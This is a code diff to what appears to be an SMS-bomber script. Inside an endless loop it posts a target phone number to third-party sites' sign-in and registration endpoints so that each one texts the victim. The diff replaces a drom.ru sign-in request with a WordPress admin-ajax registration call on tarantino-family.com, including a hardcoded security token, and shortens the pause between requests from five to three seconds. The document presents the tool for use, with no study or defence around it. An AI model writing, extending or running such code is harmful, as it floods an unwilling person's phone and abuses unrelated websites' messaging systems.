@@ -32,12 +32,13 @@ while True:
             header = {'user_agent': usr}
 
             try:
-                requests.post('https://my.drom.ru/sign?return=https%3A%2F%2Fwww.drom.ru%2F%3Ftcb%3D1618305538', headers = header, data = {'sign': number})
-                print(colored("[+]", 'green'), "Taxi571 sent")
+                requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers = header, data = {'phone': number, 'action': 'ajax_register_user', 'step': '1', 'security_login': 'e14969c2cf'})
+                print(colored("[+]", 'green'), "TarantinoFamily sent")
             except:
-                print(colored('[-]', "red"), 'Taxi571 not sent')
+                print(colored('[-]', "red"), 'TarantinoFamily not sent')
 
-            time.sleep(5)
+            time.sleep(3)
+
     elif choose == '2':
         os.system('cls' if os.name == 'nt' else 'clear')
         print('''Help:
